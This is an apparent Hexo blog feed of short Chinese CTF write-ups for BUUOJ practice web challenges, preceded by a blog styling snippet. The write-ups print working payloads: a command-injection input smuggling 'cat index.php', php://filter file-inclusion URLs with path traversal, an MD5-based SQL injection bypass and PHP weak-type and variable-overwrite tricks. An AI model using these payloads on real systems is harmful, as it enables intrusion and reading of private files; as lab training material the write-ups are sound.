<h3 id="分类页面样式"><a href="#分类页面样式" class="headerlink" title="分类页面样式"></a>分类页面样式</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source/_data/styles.styl</span><br><span class="line"></span><br><span class="line">// 分类&amp;&amp;标签 页面样式</span><br><span class="line">.post-block.page &#123;</span><br><span class="line">    margin-top: 40px;</span><br><span class="line">&#125;</span><br><span class="line">// 分类页面page</span><br><span class="line">.category-all-page &#123;</span><br><span class="line">    box-shadow: 0px 0px 10px 0px rgba(0, 0, 0, 0.5);</span><br><span class="line">    background-color: #797D7F;</span><br><span class="line">    padding: 20px 30px 60px 30px;</span><br><span class="line">    border-radius: 25px 25px 25px 25px;</span><br><span class="line">&#125;</span><br><span class="line">.category-all-title &#123;</span><br><span class="line">    font-family: Impact;</span><br><span class="line">    font-size: 24px;</span><br><span class="line">    color: aqua;</span><br><span class="line">&#125;</span><br><span class="line">.category-list &#123;</span><br><span class="line">    overflow: auto;</span><br><span class="line">&#125;</span><br><span class="line">.category-list li &#123;</span><br><span class="line">    height: 100%;</span><br><span class="line">    float: left;</span><br><span class="line">    border-right: 3px solid #222;</span><br><span class="line">    padding: 0 20px;</span><br><span class="line">&#125;</span><br><span class="line">.category-all ul li &#123;</span><br><span class="line">    list-style: none;</span><br><span class="line">&#125;</span><br><span class="line">.category-list li:last-child &#123;</span><br><span class="line">    border-right: none;</span><br><span class="line">&#125;</span><br><span class="line">.category-list li a &#123;</span><br><span class="line">    font-size: 16px;</span><br><span class="line">    text-decoration: none;</span><br><span class="line">    color: chartreuse;</span><br><span class="line">    font-family: Helvetica, Verdana, sans-serif;</span><br><span class="line">    // text-transform: uppercase;</span><br><span class="line">    -webkit-transition: all 0.5s ease;</span><br><span class="line">    -moz-transition: all 0.5s ease;</span><br><span class="line">    -o-transition: all 0.5s ease;</span><br><span class="line">    -ms-transition: all 0.5s ease;</span><br><span class="line">    transition: all 0.5s ease;</span><br><span class="line">&#125;</span><br><span class="line">.category-list li a:hover &#123;</span><br><span class="line">    color: black;</span><br><span class="line">&#125;</span><br><span class="line">.category-list li.active a &#123;</span><br><span class="line">    font-weight: bold;</span><br><span class="line">    color: black;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="头像avatar"><a href="#头像avatar" class="headerlink" title="头像avatar"></a>头像avatar</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 主题next _config.yml 文件</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Sidebar Avatar</span></span><br><span class="line">avatar:</span><br><span class="line"><span class="meta">  #</span><span class="bash"> Replace the default image and <span class="built_in">set</span> the url here.</span></span><br><span class="line">  url: /images/avatar1.gif</span><br><span class="line"><span class="meta">  #</span><span class="bash"> If <span class="literal">true</span>, the avatar will be dispalyed <span class="keyword">in</span> circle.</span></span><br><span class="line">  rounded: true</span><br><span class="line"><span class="meta">  #</span><span class="bash"> If <span class="literal">true</span>, the avatar will be rotated with the cursor.</span></span><br><span class="line">  rotated: true</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>环境配置</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF2020新生赛BackupFile</title>
    <url>/2021/03/16/blog_formal/security/CTF/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BBackupFile/</url>
    <content><![CDATA[<h1 id="ACTF2020新生赛BackupFile"><a href="#ACTF2020新生赛BackupFile" class="headerlink" title="ACTF2020新生赛BackupFile"></a>ACTF2020新生赛BackupFile</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>源码泄露</li>
<li><code>php</code>弱类型比较</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BBackupFile/1.png" alt></p>
<ul>
<li>提示源码泄露<code>index.php.bak</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>弱类型比较</li>
</ul>
<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BBackupFile/2.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>源码泄露</tag>
        <tag>php弱类型比较</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF2020新生赛Exec</title>
    <url>/2021/02/01/blog_formal/security/CTF/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BExec/</url>
    <content><![CDATA[<h1 id="ACTF2020新生赛Exec"><a href="#ACTF2020新生赛Exec" class="headerlink" title="ACTF2020新生赛Exec"></a>ACTF2020新生赛Exec</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>命令注入</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BExec/1.png" alt></p>
<ul>
<li>存在命令注入</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">127.0.0.1;cat index.php</span><br></pre></td></tr></table></figure>

<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BExec/2.png" alt></p>
<ul>
<li>拿到<code>flag</code></li>
</ul>
<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BExec/3.png" alt></p>
<p>en easy！</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>命令注入</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF2020新生赛Include</title>
    <url>/2021/01/29/blog_formal/security/CTF/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BInclude/</url>
    <content><![CDATA[<h1 id="ACTF2020新生赛Include"><a href="#ACTF2020新生赛Include" class="headerlink" title="ACTF2020新生赛Include"></a>ACTF2020新生赛Include</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>文件包含</li>
<li><code>php</code>伪协议</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BInclude/1.png" alt></p>
<ul>
<li>发现文件包含</li>
</ul>
<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BInclude/2.png" alt></p>
<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BInclude/3.png" alt></p>
<ul>
<li>伪协议</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://3898069a-3c0d-48db-96c6-94b44f2244a0.node3.buuoj.cn/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BInclude/4.png" alt></p>
<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BInclude/5.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
        <tag>php伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>ACTF2020新生赛Upload</title>
    <url>/2021/01/26/blog_formal/security/CTF/ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/</url>
    <content><![CDATA[<h1 id="ACTF2020新生赛Upload"><a href="#ACTF2020新生赛Upload" class="headerlink" title="ACTF2020新生赛Upload"></a>ACTF2020新生赛Upload</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>文件上传</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/1.png" alt></p>
<ul>
<li>前端效验</li>
</ul>
<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/2.png" alt></p>
<ul>
<li>修改数据包，上传一句话小马</li>
</ul>
<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/3.png" alt></p>
<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/4.png" alt></p>
<ul>
<li>拿到<code>flag</code></li>
</ul>
<p><img data-src="./ACTF2020%E6%96%B0%E7%94%9F%E8%B5%9BUpload/5.png" alt></p>
<p>有点简单…</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>ASIS2019Unicornshop</title>
    <url>/2021/02/03/blog_formal/security/CTF/ASIS2019Unicornshop/</url>
    <content><![CDATA[<h1 id="ASIS2019Unicornshop"><a href="#ASIS2019Unicornshop" class="headerlink" title="ASIS2019Unicornshop"></a>ASIS2019Unicornshop</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>unicode</code></li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./ASIS2019Unicornshop/1.png" alt></p>
<p><img data-src="./ASIS2019Unicornshop/2.png" alt></p>
<ul>
<li>前三个商品发现</li>
</ul>
<p><img data-src="./ASIS2019Unicornshop/3.png" alt></p>
<ul>
<li>第四个商品发现</li>
</ul>
<p><img data-src="./ASIS2019Unicornshop/4.png" alt></p>
<p>题目提示<code>unicode</code></p>
<ul>
<li>查找值大于<code>1337</code>的<code>unicode</code>字符</li>
</ul>
<p><a href="https://www.compart.com/en/unicode/search?q=thousand#characters" target="_blank" rel="noopener">https://www.compart.com/en/unicode/search?q=thousand#characters</a></p>
<p><img data-src="./ASIS2019Unicornshop/5.png" alt></p>
<p><img data-src="./ASIS2019Unicornshop/6.png" alt></p>
<p><img data-src="./ASIS2019Unicornshop/7.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>unicode</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020EasyMD5</title>
    <url>/2021/02/02/blog_formal/security/CTF/BJDCTF2020EasyMD5/</url>
    <content><![CDATA[<h1 id="BJDCTF2020EasyMD5"><a href="#BJDCTF2020EasyMD5" class="headerlink" title="BJDCTF2020EasyMD5"></a>BJDCTF2020EasyMD5</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>MD5</code>绕过</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./BJDCTF2020EasyMD5/1.png" alt></p>
<p><img data-src="./BJDCTF2020EasyMD5/2.png" alt></p>
<ul>
<li><code>ffifdyop</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">md5(ffifdyop) = 276f722736c95d99e921722cf9ed621c</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	// 276f722736c95d99e921722cf9ed621c</span><br><span class="line">	var_dump(hex2bin("276f722736c95d99e921722cf9ed621c"));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">string(16) "'or'6É]™é!r,ùíb"</span><br></pre></td></tr></table></figure>

<p><img data-src="./BJDCTF2020EasyMD5/3.png" alt></p>
<p>绕过<code>&quot;select * from &#39;admin&#39; where password=&#39; &quot;.md5($pass,true).&quot; &#39; &quot;</code></p>
<ul>
<li><code>a[]=1&amp;b[]=1</code></li>
</ul>
<p><img data-src="./BJDCTF2020EasyMD5/4.png" alt></p>
<p><img data-src="./BJDCTF2020EasyMD5/5.png" alt></p>
<ul>
<li>拿到<code>flag</code></li>
</ul>
<p><img data-src="./BJDCTF2020EasyMD5/6.png" alt></p>
<p><img data-src="./BJDCTF2020EasyMD5/7.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>MD5绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020Marklovescat</title>
    <url>/2021/02/26/blog_formal/security/CTF/BJDCTF2020Marklovescat/</url>
    <content><![CDATA[<h1 id="BJDCTF2020Marklovescat"><a href="#BJDCTF2020Marklovescat" class="headerlink" title="BJDCTF2020Marklovescat"></a>BJDCTF2020Marklovescat</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>.git</code>泄露</li>
<li><code>php</code>变量覆盖</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./BJDCTF2020Marklovescat/1.png" alt></p>
<ul>
<li><code>.git</code>泄露</li>
</ul>
<p><img data-src="./BJDCTF2020Marklovescat/2.png" alt></p>
<ul>
<li><code>githack</code>获取源码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = file_get_contents(<span class="string">'/flag'</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>突破</li>
</ul>
<p><img data-src="./BJDCTF2020Marklovescat/3.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>.git泄露</tag>
        <tag>php变量覆盖</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020The mystery of ip</title>
    <url>/2021/02/05/blog_formal/security/CTF/BJDCTF2020Themysteryofip/</url>
    <content><![CDATA[<h1 id="BJDCTF2020The-mystery-of-ip"><a href="#BJDCTF2020The-mystery-of-ip" class="headerlink" title="BJDCTF2020The mystery of ip"></a>BJDCTF2020The mystery of ip</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>XFF</code></li>
<li><code>SSTI</code></li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./BJDCTF2020Themysteryofip/1.png" alt></p>
<p><img data-src="./BJDCTF2020Themysteryofip/2.png" alt></p>
<ul>
<li>发现<code>XFF</code>绕过</li>
</ul>
<p><img data-src="./BJDCTF2020Themysteryofip/3.png" alt></p>
<ul>
<li><code>SSTI</code></li>
</ul>
<p><img data-src="./BJDCTF2020Themysteryofip/4.png" alt></p>
<p><img data-src="./BJDCTF2020Themysteryofip/5.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>XFF</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF2019Kookie</title>
    <url>/2021/03/01/blog_formal/security/CTF/BSidesCF2019Kookie/</url>
    <content><![CDATA[<h1 id="BSidesCF2019Kookie"><a href="#BSidesCF2019Kookie" class="headerlink" title="BSidesCF2019Kookie"></a>BSidesCF2019Kookie</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li><code>cookie</code>登录</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./BSidesCF2019Kookie/1.png" alt></p>
<ul>
<li>登录 <code>cookie / monster</code></li>
</ul>
<p><img data-src="./BSidesCF2019Kookie/2.png" alt></p>
<ul>
<li>修改<code>cookie</code></li>
</ul>
<p><img data-src="./BSidesCF2019Kookie/3.png" alt></p>
<p>easy!!!</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>cookie登录</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF2020Had a bad day</title>
    <url>/2021/04/13/blog_formal/security/CTF/BSidesCF2020Had_a_bad_day/</url>
    <content><![CDATA[<h1 id="BSidesCF2020Had-a-bad-day"><a href="#BSidesCF2020Had-a-bad-day" class="headerlink" title="BSidesCF2020Had a bad day"></a>BSidesCF2020Had a bad day</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>文件包含</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./BSidesCF2020Had_a_bad_day/1.png" alt></p>
<ul>
<li>发现文件包含</li>
</ul>
<p><img data-src="./BSidesCF2020Had_a_bad_day/2.png" alt></p>
<p><code>http://dc7638b0-cec4-472d-bcb5-397e4c5c5aa9.node3.buuoj.cn/index.php?category=php://filter/convert.base64-encode/resource=index.php</code></p>
<p><img data-src="./BSidesCF2020Had_a_bad_day/3.png" alt></p>
<p><code>http://dc7638b0-cec4-472d-bcb5-397e4c5c5aa9.node3.buuoj.cn/index.php?category=php://filter/convert.base64-encode/resource=index</code></p>
<p><img data-src="./BSidesCF2020Had_a_bad_day/4.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;Images that spark joy&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0, minimum-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Had a bad day?&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;css&#x2F;material.min.css&quot;&gt;</span><br><span class="line">    &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;css&#x2F;style.css&quot;&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;</span><br><span class="line">      &lt;header class&#x3D;&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;mdl-layout__header-row&quot;&gt;</span><br><span class="line">          &lt;span class&#x3D;&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;&#x2F;span&gt;</span><br><span class="line">          &lt;div class&#x3D;&quot;mdl-layout-spacer&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">      &lt;&#x2F;header&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;page-ribbon&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">      &lt;main class&#x3D;&quot;page-main mdl-layout__content&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;page-container mdl-grid&quot;&gt;</span><br><span class="line">          &lt;div class&#x3D;&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">          &lt;div class&#x3D;&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;h3&gt;Cheer up!&lt;&#x2F;h3&gt;</span><br><span class="line">              &lt;p&gt;</span><br><span class="line">                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!</span><br><span class="line">              &lt;&#x2F;p&gt;</span><br><span class="line">              &lt;div class&#x3D;&quot;page-include&quot;&gt;</span><br><span class="line">              &lt;?php</span><br><span class="line">				$file &#x3D; $_GET[&#39;category&#39;];</span><br><span class="line"></span><br><span class="line">				if(isset($file))</span><br><span class="line">				&#123;</span><br><span class="line">					if( strpos( $file, &quot;woofers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;meowers&quot; ) !&#x3D;&#x3D;  false || strpos( $file, &quot;index&quot;))&#123;</span><br><span class="line">						include ($file . &#39;.php&#39;);</span><br><span class="line">					&#125;</span><br><span class="line">					else&#123;</span><br><span class="line">						echo &quot;Sorry, we currently only support woofers and meowers.&quot;;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				?&gt;</span><br><span class="line">			&lt;&#x2F;div&gt;</span><br><span class="line">          &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;get&quot; id&#x3D;&quot;choice&quot;&gt;</span><br><span class="line">              &lt;center&gt;&lt;button onclick&#x3D;&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name&#x3D;&quot;category&quot; value&#x3D;&quot;woofers&quot; class&#x3D;&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded&#x3D;&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class&#x3D;&quot;mdl-button__ripple-container&quot;&gt;&lt;span class&#x3D;&quot;mdl-ripple is-animating&quot; style&#x3D;&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;button&gt;</span><br><span class="line">              &lt;button onclick&#x3D;&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name&#x3D;&quot;category&quot; value&#x3D;&quot;meowers&quot; class&#x3D;&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded&#x3D;&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class&#x3D;&quot;mdl-button__ripple-container&quot;&gt;&lt;span class&#x3D;&quot;mdl-ripple is-animating&quot; style&#x3D;&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;button&gt;&lt;&#x2F;center&gt;</span><br><span class="line">          &lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">          &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">      &lt;&#x2F;main&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;js&#x2F;material.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>http://dc7638b0-cec4-472d-bcb5-397e4c5c5aa9.node3.buuoj.cn/index.php?category=php://filter/convert.base64-encode/resource=./index/../flag</code></li>
</ul>
<p><img data-src="./BSidesCF2020Had_a_bad_day/5.png" alt></p>
<ul>
<li>最后的<code>flag</code></li>
</ul>
<p><img data-src="./BSidesCF2020Had_a_bad_day/6.png" alt></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>buuoj</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF2020Hurdles</title>
    <url>/2021/04/13/blog_formal/security/CTF/BSidesCF2020Hurdles/</url>
    <content><![CDATA[<h1 id="BSidesCF2020Hurdles"><a href="#BSidesCF2020Hurdles" class="headerlink" title="BSidesCF2020Hurdles"></a>BSidesCF2020Hurdles</h1><p>​    菜鸡的日常练习</p>
<a id="more"></a>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    主要利用的知识点</p>
<ul>
<li>套娃</li>
</ul>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ul>
<li>登录首页</li>
</ul>
<p><img data-src="./BSidesCF2020Hurdles/1.png" alt></p>
<ul>
<li>访问<code>/hurdles</code>目录</li>
</ul>
<p><img data-src="./BSidesCF2020Hurdles/2.png" alt></p>
<ul>
<li>换用<code>PUT</code>方法</li>
</ul>
<p><img data-src="./BSidesCF2020Hurdles/3.png" alt></p>
<ul>
<li>加上<code>!</code>  <code>http://node3.buuoj.cn:26390/hurdles/!</code></li>
</ul>
<p><img data-src="./BSidesCF2020Hurdles/4.png" alt></p>
<ul>
<li>加上<code>http://node3.buuoj.cn:26390/hurdles/!?get=flag</code></li>
</ul>
<p><img data-src="./BSidesCF2020Hurdles/5.png" alt></p>
<ul>
<li>继续添加<code>http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=1</code></li>
</ul>
<p><img data-src="./BSidesCF2020Hurdles/6.png" alt></p>
<ul>
<li>继续 <code>http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%25%30%30%0A</code></li>
</ul>
<p><img data-src="./BSidesCF2020Hurdles/7.png" alt></p>
<ul>
<li>需要认证</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -X PUT 'http://node3.buuoj.cn:26390/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A' -u 'player:player'</span><br></pre></td></tr></table></figure>

<p><img data-src="./BSidesCF2020Hurdles/8.png" alt></p>
